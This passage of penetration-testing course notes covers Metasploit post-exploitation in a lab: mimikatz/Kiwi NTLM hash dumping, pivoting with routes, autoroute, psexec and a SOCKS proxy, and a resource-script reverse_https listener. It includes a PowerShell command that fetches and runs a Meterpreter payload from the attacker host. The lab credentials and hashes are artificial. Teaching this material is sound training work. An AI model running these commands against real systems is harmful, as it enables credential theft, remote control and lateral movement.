[*] https://192.168.119.4:443 handling request from 192.168.50.223; (UUID: gokdtcex) Redirecting stageless connection from /tiUQIXcIFB-TCZIL8eJASw2GMM8KqsU3KADjTJhh8lSgwsEBpqGfM1Q0FsWwlgyPzfFi9gci43oVxGCxcYQy0mH0 with UA 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request from 192.168.50.223; (UUID: gokdtcex) Attaching orphaned/stageless session...
[*] Meterpreter session 11 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-04 10:10:16 -0400

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

Now, let's enter **`load`** with **`kiwi`** as argument to load the Kiwi module
+ Then, we can use **help** to display the commands of the Kiwi module
+ Finally, we'll use **`creds_msv`** to retrieve LM and NTLM credentials
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help

...

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
...
```

### Pivoting with Metasploit
The ability to pivot to another target or network is a vital skill for every penetration tester
+ In _Port Redirection and Pivoting_, we learned various techniques to perform pivoting
+ Instead of using these techniques manually, we can also use Metasploit to perform them

As in the previous sections, we'll connect to the bind shell on port 4444 on the machine ITWK01
+ Let's assume we are currently gathering information on the target. In this step, we'll identify a second network interface
+ Let's assume we are currently gathering information on the target
+ In this step, we'll identify a second network interface
```
C:\Users\luiza> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::c489:5302:7182:1e97%11
   IPv4 Address. . . . . . . . . . . : 192.168.50.223
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::b540:a783:94ff:89dc%14
   IPv4 Address. . . . . . . . . . . : 172.16.5.199
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 

C:\Users\luiza>
```
+ Above shows that the second interface has the assigned IP 172.16.5.199
+ We can try to identify other live hosts on this second network by leveraging methods from active information gathering
+ Before we do so, let's start a Meterpreter shell on our compromised target by downloading and executing **met.exe** as well as starting the corresponding multi/handler as we did before

Now that we have a working session on the compromised system, we can background it 
+ To add a route to a network reachable through a compromised host, we can use **route add** with the network information and session ID that the route applies to
+ After adding the route, we can display the current routes with **route print**:
```
meterpreter > bg
[*] Backgrounding session 12...

msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added

msf6 exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.255.0      Session 12

[*] There are currently no IPv6 routes defined.
```

With a path created to the internal network, we can enumerate this subnet
+ Now we could scan the whole network for live hosts with a port scan auxiliary module
+ Since this scan would take quite some time to complete, let's shorten this step by only scanning the other live host in the second network
+ Therefore, instead of setting the value of _RHOSTS_ to _172.16.5.0/24_ as we would do if we wanted to scan the whole network, we set it to 172.16.5.200. 
+ For now, we only want to scan ports 445 and 3389:
```
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp 

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389

msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.5.200:         - 172.16.5.200:445 - TCP OPEN
[+] 172.16.5.200:         - 172.16.5.200:3389 - TCP OPEN
[*] 172.16.5.200:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
+ Above shows that 172.161.5.200 has ports 445 and 3389 open
+ Let's use two modules for SMB and RDP using our pivot host ITWK01 to perform operations on the target

First, we'll attempt to use the _psexec_ module to get access on the second target as user _luiza_
+ In the previous section, we retrieved the NTLM hash via Kiwi
+ Let's assume we could successfully crack the NTLM hash and the clear-text password is _BoccieDearAeroMeow1!_
+ For _psexec_ to succeed, _luiza_ has to be a local administrator on the second machine
+ For this example, let's also assume that we confirmed this through information gathering techniques

Let's use _`exploit/windows/smb/psexec`_ and set **SMBUser** to **luiza**, **SMBPass** to **BoccieDearAeroMeow1!**, and **RHOSTS** to **172.16.5.200**

It's important to note that the added route will only work with established connections
+ Because of this, the new shell on the target must be a bind shell such as _windows/x64/meterpreter/bind_tcp_, thus allowing us to use the set route to connect to it 
+ A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network: 
```
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza

msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!

msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000
```
+ Can now run the exploit and receive a meterpreter session 

As an alternative to adding routes manually, we can use the _autoroute_ post-exploitation module to set up pivot routes through an existing Meterpreter session automatically
+ To demonstrate the usage of this module, we first need to remove the route we set manually
+ Let's terminate the Meterpreter session created through the _psexec_ module and remove all routes with **route flush**.

Now the only session left is the Meterpreter session created by executing **met.exe** as user _luiza_
+ In addition, the result of **route print** states that there are no routes defined
+ Next, let's activate the module _multi/manage/autoroute_ in which we have to set the session ID as value for the option _SESSION_ 
+ Then, let's enter **run** to launch the module:
```
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  12         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.119.4:443 -> 127.0.0.1 ()


msf6 post(multi/manage/autoroute) > set session 12
session => 12

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against ITWK01
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.5.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.50.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```
+ Above shows that _autoroute_ added 172.16.5.0/24 to the routing table

We could now use the psexec module as we did before, but we can also combine routes with the _server/socks_proxy_ auxiliary module to configure a SOCKS proxy
+ This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default
+ We set the option _SRVHOST_ to **127.0.0.1** and _VERSION_ to **5** in order to use SOCKS version 5:
```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server
```
+ We can now update our _proxychains_ configuration file (**/etc/proxychains4.conf**) to take advantage of the SOCKS5 proxy
+ After editing the configuration file, it should appear as follows:
```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

Finally, we can use **proxychains** to run **xfreerdp** to obtain GUI access from our Kali Linux system to the target machine on the internal network
```
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

The _xfreerdp_ client opens a new window providing us access to the GUI of ITWK02 in the internal network via RDP
+ We can also use a similar technique for port forwarding using the _`portfwd`_ command from inside a Meterpreter session, which will forward a specific port to the internal network

```
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] Starting interaction with 5...

meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

We can create a port forward from localhost port 3389 to port 3389 on the target host (172.16.5.200)
+ Usage:
```
portfwd add -l <LOCAL-PORT> -p <FORWARD-PORT> -r <FORWARD-IP>
```
+ Example:
```
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] Local TCP relay created: :3389 <-> 172.16.5.200:3389
```

Let's test this by connecting to 127.0.0.1:3389 with **xfreerdp** to access the compromised host in the internal network
```
kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza             
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - CN = itwk02
...
```
+ Using this technique, we are able to gain a remote desktop session on a host we were otherwise not able to reach from our Kali system
+ Likewise, if the second target machine was connected to an additional network, we could create a chain of pivots to reach further hosts

## Automating Metasploit 

### Resource Script 
Resource scripts can chain together a series of Metasploit console commands and Ruby code
+ Meaning, we can either use the built-in commands of Metasploit or write code in _Ruby_ (as it's the language Metasploit is developed in) to manage control flow as well as develop advanced logic components for resource scripts

In a penetration test, we may need to set up several multi/handler listeners each time we want to receive an incoming reverse shell
+ We could either let Metasploit run in the background the whole time or start Metasploit and manually set up a listener each time
+ We could also create a resource script to automate this task for us

Let's create a resource script that starts a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload
+ To do this, we can create a file in the home directory of the user _kali_ named **listener.rc** and open it in an editor such as _Mousepad_

We first need to think about the sequence of the commands we want to execute
+ For this example, the first command is to activate the multi/handler module
+ Then, we set the payload, which in our case, is _windows/meterpreter_reverse_https_
+ Next, we can set the _LHOST_ and _LPORT_ options to fit our needs:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
```

In addition, we can configure the _AutoRunScript_ option to automatically execute a module after a session was created
+ For this example, let's use the _post/windows/manage/migrate_ module
+ This will cause the spawned Meterpreter to automatically launch a background _notepad.exe_ process and migrate to it 
+ Automating process migration helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process:
```
set AutoRunScript post/windows/manage/migrate 
```

Let's also set _ExitOnSession_ to _false_ to ensure that the listener keeps accepting new connections after a session is created:
```
set ExitOnSession false
```
+ We can also configure advanced options such as _ExitOnSession_ in multi/handler and _AutoRunScript_ in payloads by using **show advanced** within the activated module or selected payload

Finally, we'll add _run_ with the arguments _-z_ and _-j_ to run it as a job in the background and to stop us from automatically interacting with the session
```
run -z -j
```

Now, let's save the script and start Metasploit by entering **msfconsole** with the resource script as argument for **-r**
```
sudo msfconsole -r listener.rc
```

Let's connect to the BRUTE2 machine via RDP with user _justin_ and password _SuperS3cure1337#_, start PowerShell, download the malicious Windows executable **met.exe** that we already used in previous sections, and execute it 
```
PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe

PS C:\Users\justin> .\met.exe
```

Once **met.exe** gets executed, Metasploit notifies us about the incoming connection:
```
[*] Started HTTPS reverse handler on https://192.168.119.4:443
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu) Redirecting stageless connection from /dkFg_HAPAAB9KHwqH8FRrAG1_y2iZHe4AJlyWjYMllNXBbFbYBVD2rlxUUDdTrFO7T2gg6ma5cI-GahhqTK9hwtqZvo9KJupBG7GYBlYyda_rDHTZ1aNMzcUn1x with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu) Attaching orphaned/stageless session...
[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against BRUTE2
[*] Current server process: met.exe (2004)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5340
[+] Successfully migrated into process 5340
[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02 09:54:32 -0400
```
+ Metasploit automatically migrated to the newly spawned Notepad process

Instead of creating our own resource scripts, we can also use the already provided resource scripts from Metasploit
+ They can be found in the **`scripts/resource/`** directory in the Metasploit directory
+ Full path: `/usr/share/metasploit-framework/scripts/resource`
```
kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource
total 148
-rw-r--r-- 1 root root  7270 Jul 14 12:06 auto_brute.rc
-rw-r--r-- 1 root root  2203 Jul 14 12:06 autocrawler.rc
-rw-r--r-- 1 root root 11225 Jul 14 12:06 auto_cred_checker.rc
-rw-r--r-- 1 root root  6565 Jul 14 12:06 autoexploit.rc
-rw-r--r-- 1 root root  3422 Jul 14 12:06 auto_pass_the_hash.rc
-rw-r--r-- 1 root root   876 Jul 14 12:06 auto_win32_multihandler.rc
...
-rw-r--r-- 1 root root  2419 Jul 14 12:06 portscan.rc
-rw-r--r-- 1 root root  1251 Jul 14 12:06 run_all_post.rc
-rw-r--r-- 1 root root  3084 Jul 14 12:06 smb_checks.rc
-rw-r--r-- 1 root root  3837 Jul 14 12:06 smb_validate.rc
-rw-r--r-- 1 root root  2592 Jul 14 12:06 wmap_autotest.rc
```
+ Above shows that there are resource scripts provided for port scanning, brute forcing, protocol enumerations, and so on
+ Before we attempt to use them, we should thoroughly examine, understand, and modify them to fit our needs

Some of these scripts use the global datastore of Metasploit to set options such as _RHOSTS_
+ When we use _set_ or _unset_, we define options in the context of a running module
+ However, we can also define values for options across all modules by setting _global options_. These options can be set with _setg_ and unset with _unsetg_

Resource scripts can be quite handy to automate parts of a penetration test
+ We can create a set of resource scripts for repetitive tasks and operations
+ We can prepare those scripts and then modify them for each penetration test
+ For example, we could prepare resource scripts for listeners, pivoting, post-exploitation, and much more
+ Using them on multiple penetration tests can save us a lot of time

